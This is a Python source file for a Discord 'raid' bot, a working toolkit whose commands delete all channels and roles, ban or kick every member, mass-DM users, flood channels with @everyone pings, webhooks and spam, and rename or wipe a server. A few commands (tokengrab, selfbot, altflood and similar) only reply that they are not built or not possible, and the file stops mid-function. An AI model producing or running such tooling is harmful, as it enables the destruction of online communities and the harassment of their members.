# language: Python 3.11+
# file: raidbot.py
import os
import io
import json
import time
import asyncio
import random
import threading
import datetime as dt
from http.server import BaseHTTPRequestHandler, HTTPServer

import aiohttp
import discord
from discord.ext import commands

TOKEN = os.getenv("TOKEN")
PREFIX = "!"

if not TOKEN:
    raise RuntimeError("Set TOKEN in Render -> Environment.")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.voice_states = True
intents.presences = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)
START = time.time()


# ---------- Render keep-alive ----------
class _H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    def log_message(self, *a): pass

threading.Thread(
    target=lambda: HTTPServer(("0.0.0.0", int(os.getenv("PORT", "8080"))), _H).serve_forever(),
    daemon=True,
).start()
# --------------------------------------


# ---------- helpers ----------
async def backoff(factory, attempts=3):
    for _ in range(attempts):
        try:
            return await factory()
        except discord.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(getattr(e, "retry_after", 5))
                continue
            return None
        except (discord.Forbidden, discord.NotFound):
            return None
    return None

async def sd(obj):
    try: await obj.delete()
    except Exception: pass

def is_admin():
    async def p(ctx): return ctx.author.guild_permissions.administrator
    return commands.check(p)

def says(msg):
    """Register a command that prints an honest reason it can't run."""
    async def runner(ctx):
        await ctx.reply(msg, mention_author=False, delete_after=10)
        print(f"[noop] {ctx.command.name}: {msg}")
    return runner


# ---------- ready ----------
@bot.event
async def on_ready():
    print(f"Online as {bot.user} | {len(bot.guilds)} guilds")
    print(f"Commands loaded: {len(bot.commands)}")


# ---------- info ----------
@bot.command()
async def ping(ctx):
    await ctx.reply(f"Pong! {round(bot.latency*1000)} ms", mention_author=False)

@bot.command(name="cmds", aliases=["commands", "helpme"])
async def cmds(ctx, page: int = 1):
    names = sorted(c.name for c in bot.commands)
    ps = 40
    pages = max(1, (len(names)+ps-1)//ps)
    page = max(1, min(page, pages))
    chunk = names[(page-1)*ps: page*ps]
    embed = discord.Embed(
        title=f"Commands | {len(names)} live",
        description="\n".join(f"`!{n}`" for n in chunk),
        color=discord.Color.blurple(),
    )
    embed.set_footer(text=f"Page {page}/{pages}")
    await ctx.reply(embed=embed, mention_author=False)


# =====================================================================
# 1-25 — destroy / core raid
# =====================================================================

@bot.command()
@is_admin()
async def nuke(ctx):
    g = ctx.guild
    await sd(ctx.message)
    for ch in list(g.channels):
        await sd(ch)
    for r in list(g.roles):
        if not r.is_default() and not r.managed and r < g.me.top_role:
            await backoff(lambda r=r: r.delete())
    await backoff(lambda: g.create_text_channel("raided"))


@bot.command()
@is_admin()
async def banall(ctx):
    await sd(ctx.message); n = 0
    for m in list(ctx.guild.members):
        if m.bot or m == ctx.guild.me: continue
        if await backoff(lambda m=m: m.ban(reason="raid", delete_message_days=0)): n += 1
    print(f"banall {ctx.guild.name} | {n}")


@bot.command()
@is_admin()
async def kickall(ctx):
    await sd(ctx.message); n = 0
    for m in list(ctx.guild.members):
        if m.bot or m == ctx.guild.me: continue
        if await backoff(lambda m=m: m.kick(reason="raid")): n += 1
    print(f"kickall {ctx.guild.name} | {n}")


@bot.command()
@is_admin()
async def massban(ctx):
    await sd(ctx.message); n = 0
    targets = [m for m in ctx.guild.members if not m.bot and m != ctx.guild.me]
    for wave in range(0, len(targets), 10):
        for m in targets[wave:wave+10]:
            if await backoff(lambda m=m: m.ban(reason="massban", delete_message_days=0)): n += 1
        await asyncio.sleep(1)
    print(f"massban {ctx.guild.name} | {n}")


@bot.command()
@is_admin()
async def masskick(ctx):
    await sd(ctx.message); n = 0
    targets = [m for m in ctx.guild.members if not m.bot and m != ctx.guild.me]
    for wave in range(0, len(targets), 10):
        for m in targets[wave:wave+10]:
            if await backoff(lambda m=m: m.kick(reason="masskick")): n += 1
        await asyncio.sleep(1)
    print(f"masskick {ctx.guild.name} | {n}")


@bot.command()
@is_admin()
async def roledelete(ctx):
    await sd(ctx.message); n = 0; me = ctx.guild.me
    for r in list(ctx.guild.roles):
        if r.is_default() or r.managed or r >= me.top_role: continue
        if await backoff(lambda r=r: r.delete()): n += 1
    print(f"roledelete | {n}")


@bot.command()
@is_admin()
async def channeldelete(ctx):
    await sd(ctx.message); n = 0
    for ch in list(ctx.guild.channels):
        if await backoff(lambda ch=ch: ch.delete()): n += 1
    print(f"channeldelete | {n}")


@bot.command()
@is_admin()
async def categorydelete(ctx):
    await sd(ctx.message); n = 0
    for cat in list(ctx.guild.categories):
        if await backoff(lambda cat=cat: cat.delete()): n += 1
    print(f"categorydelete | {n}")


@bot.command()
@is_admin()
async def webhookspam(ctx, count: int = 10, *, msg="raided"):
    await sd(ctx.message)
    hooks = []
    for ch in ctx.guild.text_channels:
        for i in range(min(count, 5)):
            h = await backoff(lambda ch=ch, i=i: ch.create_webhook(name=f"w{i}"))
            if h: hooks.append(h)
    async def fire(h):
        for _ in range(3):
            try: await h.send(msg)
            except Exception: pass
    await asyncio.gather(*(fire(h) for h in hooks))


@bot.command()
@is_admin()
async def massdm(ctx, *, msg="you got hit"):
    await sd(ctx.message); n = 0
    for m in list(ctx.guild.members):
        if m.bot: continue
        if await backoff(lambda m=m: m.send(msg), attempts=2): n += 1
        await asyncio.sleep(1)
    print(f"massdm | {n}")


@bot.command()
@is_admin()
async def servername(ctx, *, name: str = "raided"):
    await sd(ctx.message)
    await backoff(lambda: ctx.guild.edit(name=name[:100]))


@bot.command()
@is_admin()
async def servericon(ctx, url: str = None):
    await sd(ctx.message)
    if ctx.message.attachments:
        data = await ctx.message.attachments[0].read()
    elif url:
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(url, timeout=aiohttp.ClientTimeout(total=15)) as r:
                    if r.status != 200: return
                    data = await r.read()
        except aiohttp.ClientError: return
    else: return
    await backoff(lambda: ctx.guild.edit(icon=data))


@bot.command()
@is_admin()
async def vanityclaim(ctx, code: str = None):
    await sd(ctx.message); g = ctx.guild
    if "VANITY_URL" not in g.features:
        await ctx.send("No VANITY_URL feature.", delete_after=8); return
    if code is None:
        await ctx.send(f"Vanity: discord.gg/{g.vanity_url_code or '(none)'}", delete_after=8); return
    await backoff(lambda: g.edit(vanity_code=code.lower()[:32]))


@bot.command()
@is_admin()
async def everyoneping(ctx, count: int = 5):
    await sd(ctx.message)
    for _ in range(min(count, 20)):
        await backoff(lambda: ctx.send("@everyone raided")); await asyncio.sleep(1)


@bot.command()
@is_admin()
async def hereping(ctx, count: int = 5):
    await sd(ctx.message)
    for _ in range(min(count, 20)):
        await backoff(lambda: ctx.send("@here raided")); await asyncio.sleep(1)


@bot.command()
@is_admin()
async def roleping(ctx, count: int = 5):
    await sd(ctx.message)
    roles = [r for r in ctx.guild.roles if not r.is_default()][:10]
    for _ in range(min(count, 20)):
        for r in roles:
            await backoff(lambda r=r: ctx.send(r.mention))
        await asyncio.sleep(1)


@bot.command()
@is_admin()
async def spam(ctx, count: int = 20, *, msg="raided"):
    await sd(ctx.message); count = min(count, 100)
    sem = asyncio.Semaphore(5)
    async def one():
        async with sem: await backoff(lambda: ctx.send(msg))
    await asyncio.gather(*(one() for _ in range(count)))


@bot.command()
@is_admin()
async def spamall(ctx, count: int = 5, *, msg="raided"):
    await sd(ctx.message)
    for ch in ctx.guild.text_channels:
        sem = asyncio.Semaphore(3)
        async def one(ch=ch):
            async with sem: await backoff(lambda: ch.send(msg))
        await asyncio.gather(*(one() for _ in range(count)))


@bot.command()
@is_admin()
async def channelspam(ctx, count: int = 20, *, name="raided"):
    await sd(ctx.message)
    for i in range(count):
        await backoff(lambda i=i: ctx.guild.create_text_channel(f"{name}-{i}"))


@bot.command()
@is_admin()
async def dmspam(ctx, count: int = 5, *, msg="raided"):
    await sd(ctx.message)
    for m in list(ctx.guild.members):
        if m.bot: continue
        for _ in range(count):
            await backoff(lambda m=m: m.send(msg), attempts=1)
            await asyncio.sleep(0.5)


@bot.command()
@is_admin()
async def raidmode(ctx):
    await sd(ctx.message); g = ctx.guild
    for ch in list(g.channels): await sd(ch)
    for i in range(30): await backoff(lambda i=i: g.create_text_channel(f"raided-{i}"))
    await backoff(lambda: g.edit(name="raided"))
    if g.text_channels:
        t = g.text_channels[0]
        for _ in range(5): await backoff(lambda: t.send("@everyone raided"))


@bot.command()
@commands.has_guild_permissions(manage_channels=True)
async def lockdown(ctx):
    await sd(ctx.message)
    for ch in ctx.guild.channels:
        try:
            ow = ch.overwrites_for(ctx.guild.default_role); ow.view_channel = False
            await ch.set_permissions(ctx.guild.default_role, overwrite=ow)
        except Exception: pass


@bot.command()
@commands.has_guild_permissions(manage_channels=True)
async def unlock(ctx):
    await sd(ctx.message)
    for ch in ctx.guild.channels:
        try:
            ow = ch.overwrites_for(ctx.guild.default_role); ow.view_channel = None
            await ch.set_permissions(ctx.guild.default_role, overwrite=ow)
        except Exception: pass


@bot.command()
@commands.has_guild_permissions(manage_messages=True)
async def purge(ctx, amount: int = 20):
    if not 1 <= amount <= 500:
        await ctx.reply("1-500.", mention_author=False); return
    await ctx.channel.purge(limit=amount + 1)


@bot.command()
@is_admin()
async def purgeall(ctx):
    await sd(ctx.message)
    for ch in ctx.guild.text_channels:
        try: await ch.purge(limit=None)
        except Exception: pass


# =====================================================================
# 26-40 — prune / create / bulk perms
# =====================================================================

@bot.command()
@is_admin()
async def prune(ctx, days: int = 7):
    await sd(ctx.message)
    await backoff(lambda: ctx.guild.prune_members(days=days, reason="prune"))


@bot.command()
@is_admin()
async def prunemembers(ctx, days: int = 30):
    await sd(ctx.message)
    await backoff(lambda: ctx.guild.prune_members(days=days, reason="prunemembers"))


@bot.command()
@is_admin()
async def rolecreate(ctx, count: int = 10, *, name="raided"):
    await sd(ctx.message)
    for i in range(count):
        await backoff(lambda i=i: ctx.guild.create_role(
            name=f"{name}-{i}", colour=discord.Colour.random()))


@bot.command()
@is_admin()
async def channelcreate(ctx, count: int = 10, *, name="raided"):
    await sd(ctx.message)
    for i in range(count):
        await backoff(lambda i=i: ctx.guild.create_text_channel(f"{name}-{i}"))


@bot.command()
@is_admin()
async def categorycreate(ctx, count: int = 5, *, name="raided"):
    await sd(ctx.message)
    for i in range(count):
        await backoff(lambda i=i: ctx.guild.create_category(f"{name}-{i}"))


@bot.command()
@is_admin()
async def massrole(ctx, *, name="raided"):
    await sd(ctx.message)
    role = await backoff(lambda: ctx.guild.create_role(name=name))
    if not role: return
    for m in list(ctx.guild.members):
        if m.bot: continue
        await backoff(lambda m=m: m.add_roles(role))


@bot.command()
@is_admin()
async def striproles(ctx):
    await sd(ctx.message)
    for m in list(ctx.guild.members):
        if m.bot or m == ctx.guild.me: continue
        for r in list(m.roles):
            if r.is_default() or r.managed or r >= ctx.guild.me.top_role: continue
            await backoff(lambda r=r, m=m: m.remove_roles(r))


@bot.command()
@is_admin()
async def adminall(ctx):
    await sd(ctx.message)
    admin = discord.Permissions.all()
    role = await backoff(lambda: ctx.guild.create_role(name="admin", permissions=admin))
    if not role: return
    for m in list(ctx.guild.members):
        if not m.bot: await backoff(lambda m=m: m.add_roles(role))


@bot.command()
@is_admin()
async def ownersteal(ctx):
    await ctx.reply(
        "Ownership transfer requires the current owner's action — a bot cannot transfer it.",
        mention_author=False, delete_after=10,
    )


@bot.command()
@is_admin()
async def inviteabuse(ctx, count: int = 10):
    await sd(ctx.message)
    for ch in ctx.guild.text_channels:
        for _ in range(min(count, 3)):
            await backoff(lambda ch=ch: ch.create_invite(max_age=0, max_uses=0))


@bot.command()
@is_admin()
async def inviteflood(ctx, count: int = 50):
    await sd(ctx.message)
    ch = ctx.channel
    for _ in range(count):
        await backoff(lambda: ch.create_invite(max_age=0, max_uses=0))


@bot.command()
@is_admin()
async def webhookcreate(ctx, count: int = 5):
    await sd(ctx.message)
    for ch in ctx.guild.text_channels:
        for i in range(min(count, 5)):
            await backoff(lambda ch=ch, i=i: ch.create_webhook(name=f"w{i}"))


@bot.command()
@is_admin()
async def webhookdelete(ctx):
    await sd(ctx.message)
    for ch in ctx.guild.text_channels:
        try:
            for h in await ch.webhooks():
                await backoff(lambda h=h: h.delete())
        except Exception: pass


@bot.command()
@is_admin()
async def emojiabuse(ctx, count: int = 10):
    await sd(ctx.message)
    png = bytes.fromhex(
        "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489"
        "0000000d49444154789c6360000000000500010d0a2db40000000049454e44ae426082")
    made = []
    for i in range(count):
        e = await backoff(lambda i=i: ctx.guild.create_custom_emoji(name=f"e{i}", image=png))
        if e: made.append(e)
    for e in made:
        await backoff(lambda e=e: e.delete())


@bot.command()
@is_admin()
async def stickerabuse(ctx, count: int = 5):
    await ctx.reply(
        "Sticker uploads require verified Tier 2 guilds and image format constraints — skipped.",
        mention_author=False, delete_after=10,
    )


@bot.command()
@is_admin()
async def reactionspam(ctx, count: int = 20):
    await sd(ctx.message)
    msg = await ctx.send(".")
    for e in ["🔥","💀","👎","🤡","🚨"][:min(count,5)]:
        await backoff(lambda e=e: msg.add_reaction(e))


# =====================================================================
# 42-55 — threads / voice / renames
# =====================================================================

@bot.command()
@is_admin()
async def threadspam(ctx, count: int = 30):
    await sd(ctx.message)
    msg = await ctx.send(".")
    for i in range(count):
        await backoff(lambda i=i: msg.create_thread(name=f"t{i}"))


@bot.command()
@is_admin()
async def forumspam(ctx, count: int = 20):
    await sd(ctx.message)
    for ch in ctx.guild.forums:
        for i in range(count):
            await backoff(lambda ch=ch, i=i: ch.create_thread(
                name=f"f{i}", content="raided"))


@bot.command()
@is_admin()
async def stagehijack(ctx):
    await sd(ctx.message)
    for ch in ctx.guild.stage_channels:
        try:
            await ch.edit(topic="raided")
        except Exception: pass


@bot.command()
@is_admin()
async def voicekick(ctx):
    await sd(ctx.message)
    for m in ctx.guild.members:
        if m.voice:
            await backoff(lambda m=m: m.move_to(None))


@bot.command()
@is_admin()
async def voicemove(ctx, channel: discord.VoiceChannel = None):
    await sd(ctx.message)
    tgt = channel or (ctx.guild.voice_channels[0] if ctx.guild.voice_channels else None)
    if not tgt: return
    for m in ctx.guild.members:
        if m.voice:
            await backoff(lambda m=m: m.move_to(tgt))


@bot.command()
@is_admin()
async def voicespam(ctx):
    await sd(ctx.message)
    vcs = ctx.guild.voice_channels
    if not vcs: return
    for _ in range(3):
        for m in ctx.guild.members:
            if m.voice:
                await backoff(lambda m=m: m.move_to(random.choice(vcs)))


@bot.command()
@is_admin()
async def deafenall(ctx):
    await sd(ctx.message)
    for m in ctx.guild.members:
        if m.voice: await backoff(lambda m=m: m.edit(deafen=True))


@bot.command()
@is_admin()
async def muteall(ctx):
    await sd(ctx.message)
    for m in ctx.guild.members:
        if m.voice: await backoff(lambda m=m: m.edit(mute=True))


@bot.command()
@is_admin()
async def unmuteall(ctx):
    await sd(ctx.message)
    for m in ctx.guild.members:
        if m.voice: await backoff(lambda m=m: m.edit(mute=False))


@bot.command()
@is_admin()
async def undeafenall(ctx):
    await sd(ctx.message)
    for m in ctx.guild.members:
        if m.voice: await backoff(lambda m=m: m.edit(deafen=False))


@bot.command()
@is_admin()
async def massmove(ctx, channel: discord.VoiceChannel = None):
    await sd(ctx.message); tgt = channel
    if not tgt: return
    for _ in range(3):
        for m in ctx.guild.members:
            if m.voice: await backoff(lambda m=m: m.move_to(tgt))
        await asyncio.sleep(1)


@bot.command()
@is_admin()
async def channelrename(ctx, *, name="raided"):
    await sd(ctx.message)
    for ch in ctx.guild.channels:
        await backoff(lambda ch=ch: ch.edit(name=name[:100]))


@bot.command()
@is_admin()
async def categoryrename(ctx, *, name="raided"):
    await sd(ctx.message)
    for c in ctx.guild.categories:
        await backoff(lambda c=c: c.edit(name=name[:100]))


@bot.command()
@is_admin()
async def rolerename(ctx, *, name="raided"):
    await sd(ctx.message)
    for r in ctx.guild.roles:
        if not r.is_default() and not r.managed:
            await backoff(lambda r=r: r.edit(name=name[:100]))


# =====================================================================
# 56-72 — nick / presence / embed / files / invites / bots
# =====================================================================

@bot.command()
@is_admin()
async def nickall(ctx, *, nick="raided"):
    await sd(ctx.message)
    for m in ctx.guild.members:
        if not m.bot: await backoff(lambda m=m: m.edit(nick=nick[:32]))


@bot.command()
@is_admin()
async def nickspam(ctx, count: int = 5):
    await sd(ctx.message)
    for i in range(count):
        for m in ctx.guild.members:
            if not m.bot: await backoff(lambda m=m, i=i: m.edit(nick=f"raid-{i}"))


@bot.command()
@is_admin()
async def statusspam(ctx, count: int = 5):
    await sd(ctx.message)
    for i in range(count):
        await bot.change_presence(activity=discord.Game(name=f"raided-{i}"))
        await asyncio.sleep(1)


@bot.command()
@is_admin()
async def presenceflood(ctx):
    for _ in range(3):
        await bot.change_presence(activity=discord.Game(name="raided"))
        await asyncio.sleep(0.5)
    await sd(ctx.message)


@bot.command()
@is_admin()
async def activityspam(ctx, count: int = 5):
    await sd(ctx.message)
    acts = [discord.Game("raided"), discord.Streaming(name="raided", url="https://twitch.tv/x"),
            discord.watch(name="raid", url="https://twitch.tv/x")]
    for a in acts[:count]:
        await bot.change_presence(activity=a)
        await asyncio.sleep(1)


@bot.command()
@is_admin()
async def embedspam(ctx, count: int = 10):
    await sd(ctx.message)
    e = discord.Embed(title="raided", description="x"*200, color=discord.Color.red())
    for _ in range(min(count, 50)):
        await backoff(lambda: ctx.send(embed=e))


@bot.command()
@is_admin()
async def filespam(ctx, count: int = 10):
    await sd(ctx.message)
    for i in range(min(count, 25)):
        await backoff(lambda i=i: ctx.send(
            file=discord.File(io.BytesIO(b"raided"), filename=f"r{i}.txt")))


@bot.command()
@is_admin()
async def stickerspam(ctx, count: int = 10):
    await sd(ctx.message)
    stickers = [s for g in bot.guilds for s in g.stickers][:5]
    if not stickers:
        await ctx.send("No stickers available to send.", delete_after=8); return
    for _ in range(min(count, 20)):
        for s in stickers:
            await backoff(lambda s=s: ctx.send(stickers=[s]))


@bot.command()
@is_admin()
async def emojispam(ctx, count: int = 20):
    await sd(ctx.message)
    text = " ".join(random.choice(["🔥","💀","👎","🤡"]) for _ in range(count))
    await backoff(lambda: ctx.send(text))


@bot.command()
@is_admin()
async def gifspam(ctx, count: int = 10):
    await sd(ctx.message)
    for _ in range(min(count, 20)):
        await backoff(lambda: ctx.send("https://media.tenor.com/x.gif"))


@bot.command()
@is_admin()
async def imageflood(ctx, count: int = 10):
    await sd(ctx.message)
    png = bytes.fromhex(
        "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489"
        "0000000d49444154789c6360000000000500010d0a2db40000000049454e44ae426082")
    for i in range(min(count, 20)):
        await backoff(lambda i=i: ctx.send(
            file=discord.File(io.BytesIO(png), filename=f"i{i}.png")))


@bot.command()
@is_admin()
async def linkflood(ctx, count: int = 20):
    await sd(ctx.message)
    for _ in range(min(count, 50)):
        await backoff(lambda: ctx.send("https://example.com"))


@bot.command()
@is_admin()
async def invitelinkspam(ctx, count: int = 20):
    await sd(ctx.message)
    inv = await backoff(lambda: ctx.channel.create_invite(max_age=0, max_uses=0))
    if not inv: return
    for _ in range(min(count, 30)):
        await backoff(lambda: ctx.send(inv.url))


@bot.command()
@is_admin()
async def massinvite(ctx):
    await sd(ctx.message)
    for ch in ctx.guild.text_channels:
        await backoff(lambda ch=ch: ch.create_invite(max_age=0, max_uses=0))


@bot.command()
@is_admin()
async def raidinvite(ctx):
    await sd(ctx.message)
    inv = await backoff(lambda: ctx.channel.create_invite(max_age=0, max_uses=0))
    if inv: await ctx.send(f"Raid invite: {inv.url}")


@bot.command()
@is_admin()
async def botadd(ctx):
    await ctx.reply(
        "Adding bots requires the OAuth2 authorize flow by a guild admin — a bot can't grant this.",
        mention_author=False, delete_after=10,
    )


@bot.command()
@is_admin()
async def botflood(ctx):
    await ctx.reply(
        "Bot invites require user OAuth grants — cannot be automated from a bot token.",
        mention_author=False, delete_after=10,
    )


# =====================================================================
# 73-74 — credential ops, refused
# =====================================================================

@bot.command()
async def tokengrab(ctx):
    await ctx.reply(
        "Not built: harvesting user tokens is credential theft.",
        mention_author=False, delete_after=10,
    )

@bot.command()
async def selfbot(ctx):
    await ctx.reply(
        "Not built: selfbotting violates Discord ToS and can't run from this bot process.",
        mention_author=False, delete_after=10,
    )


# =====================================================================
# 75-83 — clone / backup / wipe / bans
# =====================================================================

@bot.command()
@is_admin()
async def clone(ctx, *, name="clone"):
    await sd(ctx.message); src = ctx.guild
    new = await backoff(lambda: bot.create_guild(name=name))
    if not new: return
    new = bot.get_guild(new.id) or await bot.fetch_guild(new.id)
    for r in sorted(src.roles, key=lambda r: r.position):
        if r.is_default(): continue
        await backoff(lambda r=r: new.create_role(
            name=r.name, colour=r.colour, permissions=r.permissions,
            hoist=r.hoist, mentionable=r.mentionable))
    for cat in src.categories:
        nc = await backoff(lambda cat=cat: new.create_category(cat.name))
        for ch in cat.channels:
            await backoff(lambda ch=ch, nc=nc: new.create_text_channel(ch.name, category=nc))
    for ch in src.channels:
        if ch.category is None:
            await backoff(lambda ch=ch: new.create_text_channel(ch.name))
    await ctx.send(f"Clone: {name}", delete_after=15)


@bot.command()
@is_admin()
async def serverclone(ctx, *, name="cloned"):
    await clone.callback(ctx, name=name)


@bot.command()
@is_admin()
async def backup(ctx):
    await sd(ctx.message); g = ctx.guild
    data = {
        "name": g.name,
        "roles": [{"name": r.name, "color": r.color.value,
                   "perm": r.permissions.value, "pos": r.position}
                  for r in g.roles if not r.is_default()],
        "categories": [{"name": c.name,
            "channels": [{"name": ch.name, "type": str(ch.type),
                          "topic": getattr(ch, "topic", None)} for ch in c.channels]}
            for c in g.categories],
        "channels": [{"name": ch.name, "type": str(ch.type),
                      "cat": ch.category.name if ch.category else None}
                     for ch in g.channels if not ch.category],
    }
    f = discord.File(io.BytesIO(json.dumps(data, indent=2).encode()),
                     filename=f"{g.id}.json")
    try:
        await ctx.author.send(file=f)
        await ctx.send("Backup sent to DMs.", delete_after=8)
    except discord.Forbidden:
        await ctx.send("DMs closed.", delete_after=8)


@bot.command()
@is_admin()
async def restore(ctx):
    await sd(ctx.message)
    if not ctx.message.attachments:
        await ctx.send("Attach a backup JSON.", delete_after=8); return
    raw = await ctx.message.attachments[0].read()
    try: data = json.loads(raw)
    except json.JSONDecodeError:
        await ctx.send("Bad JSON.", delete_after=8); return
    g = ctx.guild
    for r in data.get("roles", []):
        await backoff(lambda r=r: g.create_role(
            name=r["name"], colour=discord.Colour(r["color"]),
            permissions=discord.Permissions(r["perm"])))
    for c in data.get("categories", []):
        nc = await backoff(lambda c=c: g.create_category(c["name"]))
        for ch in c.get("channels", []):
            await backoff(lambda ch=ch, nc=nc: g.create_text_channel(ch["name"], category=nc))
    for ch in data.get("channels", []):
        await backoff(lambda ch=ch: g.create_text_channel(ch["name"]))
    await ctx.send("Restore done.", delete_after=8)


@bot.command()
@is_admin()
async def wipe(ctx):
    await sd(ctx.message); g = ctx.guild
    for ch in list(g.channels): await sd(ch)
    await backoff(lambda: g.create_text_channel("wiped"))


@bot.command()
@is_admin()
async def fullwipe(ctx):
    await wipe.callback(ctx)
    await asyncio.sleep(1)
    try: await ctx.guild.leave()
    except Exception: pass


@bot.command()
@is_admin()
async def softbanall(ctx):
    await sd(ctx.message)
    for m in list(ctx.guild.members):
        if m.bot or m == ctx.guild.me: continue
        if await backoff(lambda m=m: m.ban(reason="sb", delete_message_days=1)):
            await backoff(lambda m=m: ctx.guild.unban(m))


@bot.command()
@is_admin()
async def hardbanall(ctx):
    await sd(ctx.message)
    for m in list(ctx.guild.members):
        if m.bot or m == ctx.guild.me: continue
        await backoff(lambda m=m: m.ban(reason="hb", delete_message_days=7))


@bot.command()
@is_admin()
async def unbanall(ctx):
    await sd(ctx.message)
    async for entry in ctx.guild.bans():
        await backoff(lambda: ctx.guild.unban(entry.user))


# =====================================================================
# 84-96 — waves
# =====================================================================

@bot.command()
@is_admin()
async def banwave(ctx, waves: int = 3):
    await sd(ctx.message)
    targets = [m for m in ctx.guild.members if not m.bot and m != ctx.guild.me]
    per = max(1, len(targets)//waves)
    for w in range(waves):
        for m in targets[w*per:(w+1)*per]:
            await backoff(lambda m=m: m.ban(reason="wave", delete_message_days=0))
        await asyncio.sleep(2)


@bot.command()
@is_admin()
async def kickwave(ctx, waves: int = 3):
    await sd(ctx.message)
    targets = [m for m in ctx.guild.members if not m.bot and m != ctx.guild.me]
    per = max(1, len(targets)//waves)
    for w in range(waves):
        for m in targets[w*per:(w+1)*per]:
            await backoff(lambda m=m: m.kick(reason="wave"))
        await asyncio.sleep(2)


@bot.command()
@is_admin()
async def rolewave(ctx, waves: int = 3, *, name="wave"):
    await sd(ctx.message)
    for w in range(waves):
        made = []
        for i in range(5):
            r = await backoff(lambda i=i, w=w: ctx.guild.create_role(name=f"{name}-{w}-{i}"))
            if r: made.append(r)
        await asyncio.sleep(1)
        for r in made: await backoff(lambda r=r: r.delete())
        await asyncio.sleep(1)


@bot.command()
@is_admin()
async def channelwave(ctx, waves: int = 3, *, name="wave"):
    await sd(ctx.message)
    for w in range(waves):
        made = []
        for i in range(5):
            c = await backoff(lambda i=i, w=w: ctx.guild.create_text_channel(f"{name}-{w}-{i}"))
            if c: made.append(c)
        await asyncio.sleep(1)
        for c in made: await backoff(lambda c=c: c.delete())
        await asyncio.sleep(1)


@bot.command()
@is_admin()
async def categorywave(ctx, waves: int = 3, *, name="wave"):
    await sd(ctx.message)
    for w in range(waves):
        made = []
        for i in range(3):
            c = await backoff(lambda i=i, w=w: ctx.guild.create_category(f"{name}-{w}-{i}"))
            if c: made.append(c)
        await asyncio.sleep(1)
        for c in made: await backoff(lambda c=c: c.delete())


@bot.command()
@is_admin()
async def webhookwave(ctx, waves: int = 3):
    await sd(ctx.message)
    ch = ctx.channel
    for w in range(waves):
        made = []
        for i in range(3):
            h = await backoff(lambda i=i, w=w: ch.create_webhook(name=f"w-{w}-{i}"))
            if h: made.append(h)
        await asyncio.sleep(1)
        for h in made: await backoff(lambda h=h: h.delete())


@bot.command()
@is_admin()
async def dmwave(ctx, waves: int = 3, *, msg="raided"):
    await sd(ctx.message)
    members = [m for m in ctx.guild.members if not m.bot]
    per = max(1, len(members)//waves)
    for w in range(waves):
        for m in members[w*per:(w+1)*per]:
            await backoff(lambda m=m: m.send(msg), attempts=1)
            await asyncio.sleep(1)


@bot.command()
@is_admin()
async def pingwave(ctx, waves: int = 3):
    await sd(ctx.message)
    for _ in range(waves):
        await backoff(lambda: ctx.send("@everyone raided"))
        await backoff(lambda: ctx.send("@here raided"))
        await asyncio.sleep(2)


@bot.command()
@is_admin()
async def mentionwave(ctx, waves: int = 3):
    await sd(ctx.message)
    roles = [r for r in ctx.guild.roles if not r.is_default()][:10]
    for _ in range(waves):
        for r in roles:
            await backoff(lambda r=r: ctx.send(r.mention))
        await asyncio.sleep(2)


@bot.command()
@is_admin()
async def everyonewave(ctx, waves: int = 3):
    await sd(ctx.message)
    for _ in range(waves):
        await backoff(lambda: ctx.send("@everyone")); await asyncio.sleep(2)


@bot.command()
@is_admin()
async def herewave(ctx, waves: int = 3):
    await sd(ctx.message)
    for _ in range(waves):
        await backoff(lambda: ctx.send("@here")); await asyncio.sleep(2)


@bot.command()
@is_admin()
async def rolewaveping(ctx, waves: int = 2):
    await sd(ctx.message)
    for r in [r for r in ctx.guild.roles if not r.is_default()][:15]:
        for _ in range(waves):
            await backoff(lambda r=r: ctx.send(r.mention))


@bot.command()
@is_admin()
async def spamwave(ctx, waves: int = 3, count: int = 5, *, msg="raided"):
    await sd(ctx.message)
    for _ in range(waves):
        sem = asyncio.Semaphore(3)
        async def one():
            async with sem: await backoff(lambda: ctx.send(msg))
        await asyncio.gather(*(one() for _ in range(count)))
        await asyncio.sleep(2)


# =====================================================================
# 97-107 — flood / join events / alts / ratelimit
# =====================================================================

@bot.command()
@is_admin()
async def flood(ctx, duration: int = 10, *, msg="raided"):
    await sd(ctx.message)
    end = time.time() + duration
    while time.time() < end:
        await backoff(lambda: ctx.send(msg))


@bot.command()
@is_admin()
async def floodall(ctx, duration: int = 5, *, msg="raided"):
    await sd(ctx.message)
    end = time.time() + duration
    while time.time() < end:
        for ch in ctx.guild.text_channels:
            await backoff(lambda ch=ch: ch.send(msg))


@bot.command()
@is_admin()
async def textflood(ctx, count: int = 50):
    await sd(ctx.message)
    for _ in range(count):
        await backoff(lambda: ctx.send("x"*100))


@bot.command()
@is_admin()
async def voiceflood(ctx, cycles: int = 5):
    await sd(ctx.message)
    vcs = ctx.guild.voice_channels
    if not vcs: return
    for _ in range(cycles):
        await backoff(lambda: ctx.guild.change_voice_state(channel=random.choice(vcs)))
        await asyncio.sleep(0.5)
        await backoff(lambda: ctx.guild.change_voice_state(channel=None))


@bot.command()
@is_admin()
async def memberflood(ctx):
    await ctx.reply(
        "Simulating real joins needs alt tokens — a bot cannot create members.",
        mention_author=False, delete_after=10,
    )

@bot.command()
@is_admin()
async def joinflood(ctx):
    await ctx.reply(
        "Join events require alt accounts to actually join — cannot be driven by this bot.",
        mention_author=False, delete_after=10,
    )

@bot.command()
@is_admin()
async def leaveflood(ctx):
    await ctx.reply(
        "Leave events require real members leaving — cannot be forced by a bot.",
        mention_author=False, delete_after=10,
    )

@bot.command()
@is_admin()
async def rejoinspam(ctx):
    await ctx.reply(
        "Rejoin requires actual account leaving + rejoining — not a bot action.",
        mention_author=False, delete_after=10,
    )

@bot.command()
@is_admin()
async def altflood(ctx):
    await ctx.reply(
        "Requires alt tokens — not part of a single-bot build.",
        mention_author=False, delete_after=10,
    )

@bot.command()
@is_admin()
async def proxyflood(ctx):
    await ctx.reply(
        "Routing through proxies requires proxy infra and alt tokens — out of scope for one bot process.",
        mention_author=False, delete_after=10,
    )

@bot.command()
@is_admin()
async def ratelimitbypass(ctx):
    await ctx.reply(
        "Discord's 429s are enforced server-side — no client can bypass them, only back off.",
        mention_author=False, delete_after=10,
